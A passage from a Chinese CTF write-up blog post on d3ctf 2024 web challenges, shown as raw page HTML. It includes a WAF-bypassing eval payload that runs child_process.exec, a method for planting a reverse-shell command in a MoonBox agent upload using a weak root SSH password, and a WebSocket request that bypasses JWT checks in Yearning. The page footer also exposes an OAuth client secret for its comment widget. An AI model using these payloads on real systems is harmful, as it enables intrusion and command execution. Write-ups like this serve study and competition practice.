class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">28</span></span><br><span class="line"><span class="string">[[ 0 ]]</span></span><br><span class="line"><span class="string">stdin</span></span><br><span class="line"><span class="string">read</span></span><br><span class="line"><span class="string">Started Convertion...</span></span><br><span class="line"><span class="string">Your input is:</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">[[short - 3]]</span></span><br><span class="line"><span class="string">stdout</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">[[ 0 ]]</span></span><br><span class="line"><span class="string">stdout</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">[[short - 2]]</span></span><br><span class="line"><span class="string">stdout</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">[[ 0 ]]</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">push</span></span><br><span class="line"><span class="string">(function (...a)&#123;  return a.map(char=&gt;char.charCodeAt(0)).join(&#x27; &#x27;);&#125;)</span></span><br><span class="line"><span class="string">5</span></span><br><span class="line"><span class="string">call_interface</span></span><br><span class="line"><span class="string">Ascii is:</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">[[short - 2]]</span></span><br><span class="line"><span class="string">result</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">&#123;&#123; stack - 2 &#125;&#125;</span></span><br><span class="line"><span class="string">result</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">Ascii is:</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">[[short - 2]]</span></span><br><span class="line"><span class="string">stdout</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">&#123;&#123; stack - 3 &#125;&#125;</span></span><br><span class="line"><span class="string">stdout</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">ok</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">[[short - 2]]</span></span><br><span class="line"><span class="string">status</span></span><br><span class="line"><span class="string">write</span></span><br><span class="line"><span class="string">exit`</span></span><br><span class="line">    </span><br><span class="line">code = code.<span class="title function_">split</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; code.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    stack.<span class="title function_">push</span>(code[i])</span><br><span class="line">    <span class="keyword">if</span> (stack[i].<span class="title function_">startsWith</span>(<span class="string">&quot;[[&quot;</span>) &amp;&amp; stack[i].<span class="title function_">endsWith</span>(<span class="string">&quot;]]&quot;</span>)) &#123;</span><br><span class="line">        stack[i] = (pie + <span class="built_in">eval</span>(stack[i].<span class="title function_">slice</span>(<span class="number">2</span>,-<span class="number">2</span>).<span class="title function_">replace</span>(<span class="string">&quot;short&quot;</span>, i.<span class="title function_">toString</span>()))).<span class="title function_">toString</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">run</span>(pie + <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(respond)</span><br></pre></td></tr></table></figure>
+<p>首先第一步操作read，从stdin读取，地址为[[ 0 ]] &#x3D;&gt; pie，最大读取长度为28。但是code初始只给了20个0空位，也就是说如果读入28个，正好会把第二个操作write的读取地址覆盖，也就是可以控制write函数的读取地址。<br>这题的预期解可能是要通过一系列操作控制call_interface函数实现rce，但是waf过滤不全：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(call_interface)|\&#123;\&#123;.*?\&#125;\&#125;/g</span>;</span><br><span class="line">    <span class="keyword">return</span> str.<span class="title function_">match</span>(pattern)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>仔细看write函数，如果地址以结尾，会将中间的数据传给eval函数而正则表达式.*不能匹配换行，所以可以直接使用<code>&#123;&#123;\nrequire('child_process').exec('id')&#125;&#125;</code>执行命令。read函数可以是字符串也可以是数组，所以可以传此地址。第28位为要执行的命令，27位为传入的数据的长度，写28。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;stdin&quot;:[&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;a&quot;,&quot;28&quot;,&quot;&#123;&#123;\nrequire(&#x27;child_process&#x27;).exec(&#x27;ls / &gt; /app/index.html&#x27;)&#125;&#125;&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/../images/stack.png"><br>题目环境有个奇怪的地方，本地环境需要&#x2F;readflag，直接读flag读不出来，但远程环境&#x2F;readflag读不出来，直接读flag却可以了，dockerfile里的root用户密码也没用上，感觉怪怪的。</p>
+<h1 id="moonbox"><a href="#moonbox" class="headerlink" title="moonbox"></a>moonbox</h1><blockquote>
+<p>解决</p>
+</blockquote>
+<p>默认给了个moonbox的后台。项目地址：<a target="_blank" rel="noopener" href="https://github.com/vivo/MoonBox">https://github.com/vivo/MoonBox</a><br>flag在moonbox-server容器内。<br>官方的流程图（录制模式）<br><img src="/../images/record.png"><br>moonbox有自定义agent的功能，官方文档：</p>
+<blockquote>
+<p>已修改moonbox-agent<br>如修改过moonbox-agent代码，那么需要把修改过的agent代码重新打包。打包步骤如下<br>step1：maven打包(可选)<br>执行 mvn clean install操作<br>step2：打包moonbox-agent<br>执行打包命令，命令路径为 &#x2F;moonbox-agent&#x2F;moonbox-java-agent&#x2F;bin<br>sh .&#x2F;install-local-agent.sh<br>step3：agent包上传<br>moonbox-agent “文件更新”上传包，可以选择step2打包生成的 agengt文件即可。                 </p>
+</blockquote>
+<p>根据流程，我们可以修改agent能够在JVM所在机器中执行任意shell脚本。<br>不过呢，使用mvn打包的话容易报错，直接在.sandbox-module&#x2F;bin&#x2F;start-remote-agent.sh中写入反弹shell的命令。然后打包上传即可（moonbox-agent）。<br>目录结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.sandbox-module/</span><br><span class="line">    bin/</span><br><span class="line">        install-local-agent.sh</span><br><span class="line">        start-remote-agent.sh</span><br></pre></td></tr></table></figure>
+<p>正常版本在local-agent目录下，可以参考着改。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cxvf test.tar .sandbox-module/</span><br></pre></td></tr></table></figure>
+<p>有个坑，nginx不允许传大文件，可以把除shell脚本以外的文件删除，不影响执行。<br>连接JVM机器需要ssh连接，而容器ssh为弱口令root:123456，配置好录制流量即可执行shell脚本。</p>
+<h1 id="Doctor"><a href="#Doctor" class="headerlink" title="Doctor"></a>Doctor</h1><blockquote>
+<p>未解决</p>
+</blockquote>
+<p>最新版，项目地址：<a target="_blank" rel="noopener" href="https://github.com/cookieY/Yearning%E3%80%82">https://github.com/cookieY/Yearning。</a><br>默认密码和jwt key都改了。                 </p>
+<p>websocket可以绕过部分jwt限制。<br>对于recoder的验证，如果是websocket直接通过。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SuperRecorderGroup</span><span class="params">()</span></span> yee.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c yee.Context)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> c.IsWebsocket() &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">		role := <span class="built_in">new</span>(lib.Token).JwtParse(c)</span><br><span class="line">		<span class="keyword">if</span> role.IsRecord &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> c.ServerError(http.StatusForbidden, <span class="string">&quot;非法越权操作！&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于jwt也是</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c yee.Context)</span></span> (err <span class="type">error</span>) &#123;</span><br><span class="line">		<span class="comment">// cause upgrade websocket  will clear custom header</span></span><br><span class="line">		<span class="comment">// when header add jwt bearer that panic</span></span><br><span class="line">		<span class="keyword">if</span> c.IsWebsocket() &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>但是没有SuperManageGroup权限。只能获得普通用户权限，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v2/board/get HTTP/1.1</span><br><span class="line">Host: 192.168.72.137:8000</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Origin: http://192.168.72.137:8000</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Sec-WebSocket-Key: sH0Lj2Lf8rb5NDZOX52jbw==</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后就卡住了~~</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/d3ctf-2024/" rel="tag"># d3ctf 2024</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/19/DubheCTF-2024-WP/" rel="prev" title="DubheCTF 2024 WP">
+      <i class="fa fa-chevron-left"></i> DubheCTF 2024 WP
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#d3pythonhttp"><span class="nav-number">1.</span> <span class="nav-text">d3pythonhttp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#jwt%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.1.</span> <span class="nav-text">jwt绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82"><span class="nav-number">1.0.2.</span> <span class="nav-text">解析差异</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91"><span class="nav-number">1.0.3.</span> <span class="nav-text">突破内网</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-overflow"><span class="nav-number">2.</span> <span class="nav-text">stack_overflow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#moonbox"><span class="nav-number">3.</span> <span class="nav-text">moonbox</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Doctor"><span class="nav-number">4.</span> <span class="nav-text">Doctor</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Zoiltin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zoiltin</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '5d255510a11e0afdd868',
+      clientSecret: '8252d818d311dbc47b2db2b855e02cb69df60cbd',
+      repo        : 'BlogComments',
+      owner       : 'zoiltin',
+      admin       : ['zoiltin'],
+      id          : '8c88224fabadc8628388dd8b5e1f1d11',
+        language: 'ch-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
